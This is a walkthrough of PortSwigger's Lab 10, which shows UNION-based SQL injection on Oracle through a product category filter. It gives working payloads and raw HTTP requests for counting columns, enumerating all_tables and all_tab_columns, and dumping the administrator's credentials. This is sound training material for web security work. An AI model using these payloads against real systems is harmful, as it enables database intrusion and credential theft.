# SQL Injection - Lab #10: SQL injection attack, listing the database contents on Oracle

**YouTube Tutorial:** [Lab #10 SQL injection attack, listing the database contents on Oracle](https://www.youtube.com/watch?v=ZbwIbIq5-eE)

---

## 1. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Core Concept:** A SQL injection vulnerability exists in the product category filter (`category`). The backend application concatenates user input directly into an Oracle SQL query and renders the resulting query dataset directly inside the HTTP response body.
* **Vulnerability Behavior:** Because query results are returned directly to the browser, an attacker can leverage a `UNION`-based SQL injection to query Oracle's data dictionary system tables (`all_tables` and `all_tab_columns`), enumerate dynamically named user credential tables, and extract the administrator password.

### Root Cause & Impact

* **Root Cause:** Unsanitized dynamic string concatenation in SQL queries without parameterization.
* **Oracle Data Dictionary Views:**
1. `all_tables`: System view containing details on all accessible tables. The key column to extract table names is `table_name`.
2. `all_tab_columns`: System view containing details on all table columns. Key columns to extract are `column_name` and `table_name`.
3. **Strict Syntax Rules:** Oracle requires every `SELECT` query to have a `FROM` clause. All `UNION` queries must reference a valid view/table or use `DUAL`.


* **Goal:** Determine column count, confirm Oracle database compatibility, enumerate table names from `all_tables`, discover column names from `all_tab_columns`, extract administrator credentials, and log into the application.

---

## 2. Attack Methods & Techniques

### Method Details

* **Phase 1 (Column Count & Data Types):** Use `ORDER BY N--` to determine column count and `UNION SELECT 'a', 'a' FROM dual--` to confirm that both columns support text/string literals.
* **Phase 2 (Table Enumeration):** Query `all_tables` using `UNION SELECT table_name, NULL FROM all_tables--` to discover the dynamically generated credentials table (e.g., `USERS_XXXXXX`).
* **Phase 3 (Column Enumeration):** Query `all_tab_columns` filtering by table name using `UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_XXXXXX'--` to discover the custom username and password column names.
* **Phase 4 (Credential Dumping & Authentication):** Extract the credentials via `UNION SELECT USERNAME_XXXXXX, PASSWORD_XXXXXX FROM USERS_XXXXXX--`, retrieve the administrator's password, and log in to complete the lab.

### Server Behavior

* **Missing `FROM` clause or incorrect query structure:** Triggers an Oracle SQL error, returning an **HTTP 500 Internal Server Error**.
* **Valid Oracle Query:** Returns an **HTTP 200 OK** response and renders system view metadata or target credentials directly on the page.

---

## 3. Attack Flowchart

```
+-------------------------------------------------------+
|  Step 1: Intercept Product Filter Request (category)  |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 2: Determine Column Count & String Compatibility|
|  • ORDER BY 3--                -> HTTP 500            |
|  • UNION SELECT 'a','a' FROM dual-- -> HTTP 200 OK    |
|  Result: 2 String Columns                             |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 3: Enumerate Table Names on Oracle              |
|  UNION SELECT table_name, NULL FROM all_tables--      |
|  Result: Discovered table 'USERS_ABCDEF'              |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 4: Enumerate Column Names                       |
|  UNION SELECT column_name, NULL FROM all_tab_columns  |
|  WHERE table_name='USERS_ABCDEF'--                    |
|  Result: Discovered columns 'USERNAME_...', 'PASSWORD_...'|
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 5: Dump Administrator Credentials               |
|  UNION SELECT USERNAME_..., PASSWORD_...              |
|  FROM USERS_ABCDEF--                                  |
|  Log in as 'administrator' to solve lab               |
+-------------------------------------------------------+

```

---

## 4. Step-by-Step Walkthrough

### Step 1: Confirm Column Count and Data Types

1. Test column indices:
* `category=Gifts'+ORDER+BY+1--` $\rightarrow$ **HTTP 200 OK**
* `category=Gifts'+ORDER+BY+2--` $\rightarrow$ **HTTP 200 OK**
* `category=Gifts'+ORDER+BY+3--` $\rightarrow$ **HTTP 500 Internal Server Error**


2. Verify string compatibility using `dual`:
* `category=Gifts'+UNION+SELECT+'a',+'a'+FROM+dual--` $\rightarrow$ **HTTP 200 OK**


3. **Result:** Total 2 columns, both supporting string values on Oracle.

### Step 2: Enumerate Oracle Table Names

Query the Oracle system view `all_tables` to find the custom user credentials table:

* **Payload:**
```sql
Gifts' UNION SELECT table_name, NULL FROM all_tables--

```


* **Raw Request:**
```http
GET /filter?category=Gifts%27+UNION+SELECT+table_name%2C+NULL+FROM+all_tables-- HTTP/1.1
Host: [LAB-ID].web-security-academy.net

```


* **Result:** Search the response output for a table starting with `USERS_` (e.g., `USERS_ABCDEF`).

### Step 3: Enumerate Oracle Column Names

Query `all_tab_columns` filtering by the exact target table name in uppercase:

* **Payload:**
```sql
Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--

```


* **Raw Request:**
```http
GET /filter?category=Gifts%27+UNION+SELECT+column_name%2C+NULL+FROM+all_tab_columns+WHERE+table_name%3D%27USERS_ABCDEF%27-- HTTP/1.1
Host: [LAB-ID].web-security-academy.net

```


* **Result:** Retrieve column names for usernames and passwords (e.g., `USERNAME_XYZ123` and `PASSWORD_XYZ123`).

### Step 4: Extract Credentials & Solve Lab

Query the target table using the dynamically identified table and column names:

* **Payload:**
```sql
Gifts' UNION SELECT USERNAME_XYZ123, PASSWORD_XYZ123 FROM USERS_ABCDEF--

```


* **Raw Request:**
```http
GET /filter?category=Gifts%27+UNION+SELECT+USERNAME_XYZ123%2C+PASSWORD_XYZ123+FROM+USERS_ABCDEF-- HTTP/1.1
Host: [LAB-ID].web-security-academy.net

```


* **Extract Credentials:** Copy the password associated with `administrator`.
* **Complete Lab:** Navigate to the `/login` page, submit credentials for `administrator`, and log in.

---

## 5. Pro-Tips & Common Pitfalls

* **Uppercase Table Names in Oracle Metadata:** Oracle stores table and column names in **UPPERCASE** inside `all_tables` and `all_tab_columns` by default. When filtering with `WHERE table_name='USERS_XXXXXX'`, make sure the table name string is entirely capitalized.
* **Oracle System Views Cheat Sheet:**
* **List All Tables:** `SELECT table_name FROM all_tables`
* **List All Columns:** `SELECT column_name FROM all_tab_columns WHERE table_name='TABLE_NAME'`
* **Dummy Table:** `dual` (used whenever selecting non-table expressions or literal values)



This video is directly relevant as it demonstrates Rana Khalil's step-by-step walkthrough for enumerating Oracle system tables and solving PortSwigger Lab 10.